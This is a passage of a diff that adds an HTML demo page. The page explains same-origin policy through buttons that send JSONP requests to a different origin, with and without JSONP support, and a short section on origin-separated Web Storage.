+                                    Click the button <b>below</b> to send a <b>JSONP request</b> to a <b>different origin with CORS not configured</b> and whose response is <b>NOT JSONP supported</b>
+                                    <button id='jsonp-nosupport'>JSONP request to Different Origin</button>
+                                    <div id='data-wrapper-jsonp-nosupport'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Open up the <b>console</b> and see <b>errors from the JSONP response</b>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    Click the button <b>below</b> to send a <b>JSONP request</b> to a <b>different origin with CORS not configured</b> and whose response <b>IS JSONP supported</b>
+                                    <button id='jsonp-support'>JSONP request to Different Origin</button>
+                                    <div id='data-wrapper-jsonp-support'></div>
+                                </li>
+                                <li><span>&#x279F;</span>
+                                    You should see JSON data appear <b>above</b> from the <b>JSONP response</b>
+                                </li>
+                            </ol>
+                        </article>
+                    </section>
+
+                    <section id='web-storage'>
+                        <h2>Web Storage (LocalStorage and SessionStorage)</h2>
+
+                        <p><span>&#10148;</span>
+                            <b>Web Storage</b> is separated by <b>Origin</b> (page can only access Web Storage data stored in <b>same origin</b>)
+                        </p>
+                    </section>
+
+
+                </article>
+                
+            </main>
+
+        </div>
+        
+        <script
+			  src="http://code.jquery.com/jquery-3.5.1.min.js"
+			  integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+              crossorigin="anonymous"
+        ></script>
+        <script type="text/javascript" src="js/scripts.js"></script>
+    </body>
+
+</html>
